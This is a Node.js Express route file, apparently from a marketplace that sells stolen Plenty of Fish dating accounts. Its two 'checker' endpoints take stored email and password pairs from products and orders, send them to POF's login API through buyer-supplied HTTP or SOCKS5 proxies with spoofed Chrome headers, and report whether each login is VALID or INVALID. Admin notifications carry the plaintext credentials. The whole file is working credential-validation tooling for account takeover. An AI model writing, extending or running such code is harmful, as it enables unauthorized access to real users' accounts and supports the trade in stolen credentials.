const express = require("express");
const router = express.Router();
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { getLogger } = require("../../lib/logger");
const { authenticateToken } = require("../../lib/auth");
const redis = require("../../lib/redis");

const logger = getLogger("checkers", { msgPrefix: "[CHECKERS] " });

const prisma = require("../../lib/prisma");

// Middleware: All logged in users can access checkers now (buyers need to check before buying)
router.use(authenticateToken);

/**
 * @swagger
 * /api/checkers/pof:
 *   post:
 *     tags: [checkers]
 *     summary: POF account checker tool (Admin only for testing)
 *     security:
 *       - bearerAuth: []
 */
router.post("/pof", async (req, res) => {
    try {
        const { productId, proxyString, proxyType } = req.body;
        if (!productId || !proxyString || !proxyType) {
            return res.status(400).json({ error: "Missing required fields" });
        }

        // Security 1: Rate limiting per user (Max 3 checks per minute)
        const userLimitKey = `check_limit_${req.user.id}`;
        const currentChecks = (await redis.getJson(userLimitKey)) || 0;
        if (currentChecks >= 3) {
            return res.status(429).json({ status: "FAIL", message: "Rate limit exceeded. Please wait a minute." });
        }
        await redis.setJson(userLimitKey, currentChecks + 1, 60); // 60 seconds TTL

        // Security 2: Cache the check result for this product for 5 minutes
        const cacheKey = `pof_check_${productId}`;
        const cachedResult = await redis.getJson(cacheKey);
        if (cachedResult) {
            return res.json(cachedResult);
        }

        const product = await prisma.product.findUnique({
            where: { id: productId },
            select: { logContent: true }
        });

        if (!product || !product.logContent) {
            return res.status(404).json({ error: "Product not found or empty" });
        }

        const logContent = product.logContent.trim();
        let email, password;

        if (logContent.includes('|')) {
            const parts = logContent.split('|').map(p => p.trim());
            if (parts.length >= 2) {
                email = parts[parts.length - 2];
                password = parts[parts.length - 1];
            }
        } else if (logContent.includes(':')) {
            const parts = logContent.split(':').map(p => p.trim());
            if (parts.length >= 2) {
                email = parts[0];
                password = parts.slice(1).join(':');
            }
        }

        if (!email || !password) {
             return res.status(400).json({ error: "Invalid log content format" });
        }

        let formattedProxy = proxyString.trim();
        const proxyParts = formattedProxy.split(':');
        if (proxyParts.length === 4) {
            // host:port:user:pass -> user:pass@host:port
            formattedProxy = `${proxyParts[2]}:${proxyParts[3]}@${proxyParts[0]}:${proxyParts[1]}`;
        }

        let agent = null;
        if (proxyType === "HTTP" || proxyType === "HTTPS") {
            agent = new HttpsProxyAgent(`http://${formattedProxy}`);
        } else if (proxyType === "SOCKS5") {
            agent = new SocksProxyAgent(`socks5://${formattedProxy}`);
        } else {
            return res.status(400).json({ error: "Invalid proxy type" });
        }

        const data = JSON.stringify({
            userName: email,
            password: password,
            app: "POF",
            appVersion: "2.88.3",
            platform: "p2wdesktop",
            platformVersion: "2.88.3",
            deviceId: "p2web"
        });

        const config = {
            method: 'post',
            url: 'https://2.api.pof.com/session/login',
            headers: { 
                'host': '2.api.pof.com', 
                'sec-ch-ua-platform': '"Windows"', 
                'x-pof-edge-experiments': '', 
                'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"', 
                'sec-ch-ua-mobile': '?0', 
                'pof-platform': 'p2wdesktop 2.88.3', 
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 
                'accept': 'application/json', 
                'x-pof-install-id': '28bb104a-112a-4fd0-ace7-043805e3c870', 
                'origin': 'https://www.pof.com', 
                'sec-fetch-site': 'same-site', 
                'sec-fetch-mode': 'cors', 
                'sec-fetch-dest': 'empty', 
                'referer': 'https://www.pof.com/', 
                'accept-encoding': 'gzip, deflate, br, zstd', 
                'accept-language': 'en-US,en;q=0.9', 
                'priority': 'u=1, i',
                'Content-Type': 'application/json'
            },
            data: data,
            httpsAgent: agent,
            httpAgent: agent,
            validateStatus: () => true, // Resolve all statuses to inspect the code
            timeout: 15000 // 15s timeout
        };

        const response = await axios.request(config);
        const respText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

        let finalResult = { status: "FAIL", message: "Unknown response from POF" };

        if (response.status === 400 || respText.includes("invalidPassword")) {
            finalResult = { status: "INVALID" };
        } else if (respText.includes("authenticationToken") || respText.includes("sessionToken")) {
            finalResult = { status: "VALID" };
        } else if (response.status === 403) {
            finalResult = { status: "FAIL", message: "Proxy Blocked by Cloudflare" };
        }

        // Save result to cache before returning
        await redis.setJson(cacheKey, finalResult, 300); // Cache for 5 minutes
        return res.json(finalResult);

    } catch (err) {
        logger.error("POF Check failed:", err.message);
        res.status(500).json({ status: "FAIL", message: err.message });
    }
});

/**
 * @swagger
 * /api/checkers/order:
 *   post:
 *     tags: [checkers]
 *     summary: Verify a purchased POF account and set its checkStatus.
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required: [orderId, proxyString, proxyType]
 *             properties:
 *               orderId:
 *                 type: string
 *               proxyString:
 *                 type: string
 *               proxyType:
 *                 type: string
 *     responses:
 *       200:
 *         description: Check result (VALID, INVALID, FAIL).
 */
router.post("/order", async (req, res) => {
    try {
        const { orderId, proxyString, proxyType } = req.body;
        if (!orderId || !proxyString || !proxyType) {
            return res.status(400).json({ error: "Missing required fields" });
        }

        // Security 1: Rate limiting per user
        const userLimitKey = `check_limit_order_${req.user.id}`;
        const currentChecks = (await redis.getJson(userLimitKey)) || 0;
        if (currentChecks >= 5) {
            return res.status(429).json({ status: "FAIL", message: "Rate limit exceeded. Please wait a minute." });
        }
        await redis.setJson(userLimitKey, currentChecks + 1, 60);

        const order = await prisma.order.findUnique({
            where: { id: orderId }
        });

        if (!order || order.userId !== req.user.id) {
            return res.status(404).json({ error: "Order not found" });
        }

        // If it's already VALID, don't check again to save resources
        if (order.checkStatus === "VALID") {
            return res.json({ status: "VALID" });
        }

        const logContent = order.purchasedContent.trim();
        let email, password;

        if (logContent.includes('|')) {
            const parts = logContent.split('|').map(p => p.trim());
            if (parts.length >= 2) {
                email = parts[parts.length - 2];
                password = parts[parts.length - 1];
            }
        } else if (logContent.includes(':')) {
            const parts = logContent.split(':').map(p => p.trim());
            if (parts.length >= 2) {
                email = parts[0];
                password = parts.slice(1).join(':');
            }
        }

        if (!email || !password) {
             return res.status(400).json({ error: "Invalid log content format in order" });
        }

        let formattedProxy = proxyString.trim();
        const proxyParts = formattedProxy.split(':');
        if (proxyParts.length === 4) {
            formattedProxy = `${proxyParts[2]}:${proxyParts[3]}@${proxyParts[0]}:${proxyParts[1]}`;
        }

        let agent = null;
        if (proxyType === "HTTP" || proxyType === "HTTPS") {
            agent = new HttpsProxyAgent(`http://${formattedProxy}`);
        } else if (proxyType === "SOCKS5") {
            agent = new SocksProxyAgent(`socks5://${formattedProxy}`);
        } else {
            return res.status(400).json({ error: "Invalid proxy type" });
        }

        const data = JSON.stringify({
            userName: email,
            password: password,
            app: "POF",
            appVersion: "2.88.3",
            platform: "p2wdesktop",
            platformVersion: "2.88.3",
            deviceId: "p2web"
        });

        const config = {
            method: 'post',
            url: 'https://2.api.pof.com/session/login',
            headers: { 
                'host': '2.api.pof.com', 
                'sec-ch-ua-platform': '"Windows"', 
                'x-pof-edge-experiments': '', 
                'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"', 
                'sec-ch-ua-mobile': '?0', 
                'pof-platform': 'p2wdesktop 2.88.3', 
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 
                'accept': 'application/json', 
                'x-pof-install-id': '28bb104a-112a-4fd0-ace7-043805e3c870', 
                'origin': 'https://www.pof.com', 
                'sec-fetch-site': 'same-site', 
                'sec-fetch-mode': 'cors', 
                'sec-fetch-dest': 'empty', 
                'referer': 'https://www.pof.com/', 
                'accept-encoding': 'gzip, deflate, br, zstd', 
                'accept-language': 'en-US,en;q=0.9', 
                'priority': 'u=1, i',
                'Content-Type': 'application/json'
            },
            data: data,
            httpsAgent: agent,
            httpAgent: agent,
            validateStatus: () => true,
            timeout: 15000 
        };

        const response = await axios.request(config);
        const respText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

        let finalResult = { status: "FAIL", message: "Unknown response from POF" };

        if (response.status === 400 || respText.includes("invalidPassword")) {
            finalResult = { status: "INVALID" };
        } else if (respText.includes("authenticationToken") || respText.includes("sessionToken")) {
            finalResult = { status: "VALID" };
        } else if (response.status === 403) {
            finalResult = { status: "FAIL", message: "Proxy Blocked by Cloudflare" };
        }

        if (finalResult.status === "VALID") {
            await prisma.order.update({
                where: { id: order.id },
                data: { checkStatus: "VALID", checkCompletedAt: new Date() }
            });
        } else if (finalResult.status === "INVALID" || finalResult.status === "FAIL") {
            const newAttempts = (order.checkAttempts || 0) + 1;
            if (newAttempts >= 2) {
                await prisma.order.update({
                    where: { id: order.id },
                    data: { checkStatus: "INVALID_FINAL", checkAttempts: newAttempts, checkCompletedAt: new Date() }
                });
                
                const admins = await prisma.user.findMany({ where: { rank: "ADMIN" } });
                const notifs = admins.map(a => ({
                    userId: a.id,
                    message: `[POF CHECKER] Invalid login detected on Order #${order.id}. Account Details: ${logContent}`,
                    type: "SYSTEM",
                    link: `/admin/dashboard`
                }));
                if (notifs.length > 0) {
                    await prisma.notification.createMany({ data: notifs });
                }
                
                finalResult.status = "INVALID_FINAL";
            } else {
                await prisma.order.update({
                    where: { id: order.id },
                    data: { checkStatus: "INVALID_1", checkAttempts: newAttempts }
                });
                finalResult.status = "INVALID_1";
            }
        }

        return res.json(finalResult);

    } catch (err) {
        logger.error("Order POF Check failed:", err.message);
        res.status(500).json({ status: "FAIL", message: err.message });
    }
});

module.exports = {
    path: "/api/checkers",
    router,
};
